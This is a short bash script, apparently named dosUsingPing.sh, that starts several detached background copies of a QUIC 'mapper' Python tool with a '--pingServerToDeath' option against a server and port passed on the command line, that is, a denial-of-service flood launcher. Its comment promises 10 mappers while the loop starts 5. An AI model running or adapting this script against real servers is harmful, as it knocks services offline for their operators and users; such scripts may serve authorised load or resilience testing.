#!/bin/bash

# 
# create 10 mapper processes and each mapper generate 5000 connections to ping the server
# usage: ./dosUsingPing.sh <server> <serverPort>

startingPort=9000
server=$1
serverPort=$2

for i in {1..5}
do  
    echo $startingPort
    setsid ../quicMapper/env/bin/python ../quicMapper/mapper.py -s $server -p $startingPort -t $serverPort --pingServerToDeath > /dev/null &
    startingPort=$(($startingPort + 10000))
done

echo "Started all Mappers."